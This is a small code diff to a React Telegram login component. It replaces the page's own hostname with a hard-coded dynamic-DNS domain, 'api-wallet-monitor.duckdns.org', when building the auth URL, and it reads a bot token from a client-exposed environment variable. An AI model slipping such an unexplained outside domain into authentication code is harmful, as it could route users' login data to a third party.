@@ -8,7 +8,7 @@ const TelegramAuth = ({ onAuthSuccess, onAuthFailure }) => {
   useEffect(() => {
     // Generate Telegram auth URL
     const botToken = process.env.REACT_APP_TELEGRAM_BOT_TOKEN;
-    const domain = window.location.hostname;
+    const domain = 'api-wallet-monitor.duckdns.org';
     const redirectUrl = `${window.location.origin}/auth/telegram/callback`;
     
     if (botToken) {
